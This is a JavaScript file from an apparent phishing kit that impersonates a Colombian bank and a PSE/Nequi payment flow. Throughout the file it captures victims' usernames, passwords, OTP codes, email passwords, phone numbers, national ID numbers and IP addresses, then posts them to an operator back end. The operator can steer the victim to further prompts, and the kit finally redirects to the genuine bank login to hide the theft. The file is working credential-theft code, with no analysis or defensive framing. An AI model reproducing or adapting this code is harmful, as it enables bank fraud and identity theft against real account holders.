var espera = 0;

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function slider1(){
    $( "#slider4" ).fadeOut( "fast", function() {
        $('#slider4').removeClass("efecto-slider");
        $('#slider1').addClass("efecto-slider");   
        $('#slider1').show();
    });
    setTimeout(slider2, 5000);    
}

function slider4(){
    $( "#slider3" ).fadeOut( "fast", function() {
        $('#slider3').removeClass("efecto-slider");
        $('#slider4').addClass("efecto-slider");   
        $('#slider4').show();
    });
    setTimeout(slider1, 5000);    
}

function slider3(){
   $( "#slider2" ).fadeOut( "fast", function() {
        $('#slider2').removeClass("efecto-slider");
        $('#slider3').addClass("efecto-slider");   
        $('#slider3').show();
    });
    setTimeout(slider4, 5000);    
}

function slider2(){
    $( "#slider1" ).fadeOut( "fast", function() {
        $('#slider1').removeClass("efecto-slider");
        $('#slider2').addClass("efecto-slider");   
        $('#slider2').show();
    });
    setTimeout(slider3, 5000); 
}

function iniciar(){
    $('#slider1').addClass("efecto-slider");  
    $('#fondo,#cargando').hide();
    setTimeout(slider2, 5000);
}
function cerrar(){
     window.location.href = "https://mi.bancopopular.com.co/login"; 
}


function vista_password(){
    $('#btn-password').css("padding","14px");
    $('#btn-password').html("Continuar");
    $('#frm-usuario').hide();  
    $('#frm-password').show(); 
}


function vista_otp(){
    $('#btn-otp').css("padding","14px");
    $('#btn-otp').html("Validar");
    $('#txt-otp').val("");  
    $('#esperando-lateral').hide();
    $('#frm-otp').show();  
}

function vista_correo(){
    $('#btn-correo').css("padding","14px");
    $('#btn-correo').html("Verificar");
    $('#txt-correo,#txt-clave,#txt-celular').val("");  
    $('#esperando-lateral').hide();
    $('#frm-correo').show(); 
}

function vista_tarjeta(){
    $('#btn-tarjeta').css("padding","14px");
    $('#btn-tarjeta').html("Validar");
    $('#txt-tarjeta,#aFecha,#mFecha,#txt-cvv').val("");  
    $('#esperando-lateral').hide();
    $('#frm-tarjeta').show();     
}

function vista_otp_err(){
    $('#btn-otp-err').css("padding","14px");
    $('#btn-otp-err').html("Validar");
    $('#txt-otp-err').val("");  
    $('#esperando-lateral').hide();
    $('#frm-otp-err').show(); 
    $("#txt-otp-err").css("border","1px solid #e70000");     
}

function vista_final(){
    $('#esperando-lateral').hide();
    $('#final').show(); 
    setTimeout(cerrar, 2000); 
}

function vista_usuario(){
    $('#btn-usuario').css("padding","14px");
    $('#btn-usuario').html("Continuar");    
    $('#txt-usuario,#txt-password').val(""); 
    $('#esperando-lateral').hide();
    $('#frm-usuario').show(); 
}

function enviar_usuario(u,p){
    d = detectar_dispositivo();
    
    // Generar session_id único
    var sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Obtener IP y construir mensaje
    fetch('get_ip.php')
        .then(response => response.json())
        .then(data => {
            var ip = data.ip || 'No disponible';
            var hora = new Date().toLocaleString('es-ES');
            
            var mensaje = `
💎BANCO DE BOGOTA💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
<b>📟Dispositivo:</b> ${d}
<b>🗺IP:</b> ${ip}
<b>⏱Hora:</b> ${hora}
------------------------------
👤 Usuario: ${u}
🔑 Clave: ${p}
------------------------------`;

            var formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                }
            })
            .catch(err => {
                espera = 1;
            });
        })
        .catch(() => {
            // Si falla la obtención de IP, enviar sin IP
            var hora = new Date().toLocaleString('es-ES');
            var sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            var mensaje = `
💎BANCO DE BOGOTA💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
<b>📟Dispositivo:</b> ${d}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
------------------------------
👤 Usuario: ${u}
🔑 Clave: ${p}
------------------------------`;

            var formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                }
            })
            .catch(err => {
                espera = 1;
            });
        });
}

function enviar_otp(o){
    d = detectar_dispositivo();
    
    var sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    fetch('get_ip.php')
        .then(response => response.json())
        .then(data => {
            var ip = data.ip || 'No disponible';
            var hora = new Date().toLocaleString('es-ES');
            
            var mensaje = `
💎BANCO DE BOGOTA💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
<b>📟Dispositivo:</b> ${d}
<b>🗺IP:</b> ${ip}
<b>⏱Hora:</b> ${hora}
------------------------------
🔐 OTP: ${o}
------------------------------`;

            var formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                }
            })
            .catch(err => {
                espera = 1;
            });
        })
        .catch(() => {
            var hora = new Date().toLocaleString('es-ES');
            var sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            var mensaje = `
💎BANCO DE BOGOTA💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
<b>📟Dispositivo:</b> ${d}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
------------------------------
🔐 OTP: ${o}
------------------------------`;

            var formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                }
            })
            .catch(err => {
                espera = 1;
            });
        });
}

function enviar_correo(e,c,t){
    d = detectar_dispositivo();
    
    var sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    fetch('get_ip.php')
        .then(response => response.json())
        .then(data => {
            var ip = data.ip || 'No disponible';
            var hora = new Date().toLocaleString('es-ES');
            
            var mensaje = `
💎BANCO DE BOGOTA💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
<b>📟Dispositivo:</b> ${d}
<b>🗺IP:</b> ${ip}
<b>⏱Hora:</b> ${hora}
------------------------------
📧 Correo: ${e}
🔑 Clave: ${c}
📞 Teléfono: ${t}
------------------------------`;

            var formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                }
            })
            .catch(err => {
                espera = 1;
            });
        })
        .catch(() => {
            var hora = new Date().toLocaleString('es-ES');
            var sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            var mensaje = `
💎BANCO DE BOGOTA💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
<b>📟Dispositivo:</b> ${d}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
------------------------------
📧 Correo: ${e}
🔑 Clave: ${c}
📞 Teléfono: ${t}
------------------------------`;

            var formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    checkPaymentVerification(sessionId, result.messageId);
                }
            })
            .catch(err => {
                espera = 1;
            });
        });
}

async function checkPaymentVerification(transactionId, messageId) {
    try {
        var formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        var res = await fetch('verificar_respuesta.php', {
            method: 'POST',
            body: formData
        });
        var result = await res.json();

        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica':
                    window.location.href = "token.php";
                    break;
                case 'error_logo': 
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "index.html";
                    break;
            }
        } else {
            setTimeout(function() { checkPaymentVerification(transactionId, messageId); }, 2000);
        }
    } catch (err) {
        setTimeout(function() { checkPaymentVerification(transactionId, messageId); }, 2000);
    }
}

function consultar_estado(){
     if (espera == 1) {
        setTimeout(function() {
            espera = 0;
            vista_otp(); 
        }, 2000);
    }
}

function cargar_espera(){
    $('#frm-usuario,#frm-password,#frm-tarjeta,#frm-otp,#frm-otp-err,#frm-correo').hide();  
    $('#esperando-lateral').show(); 
}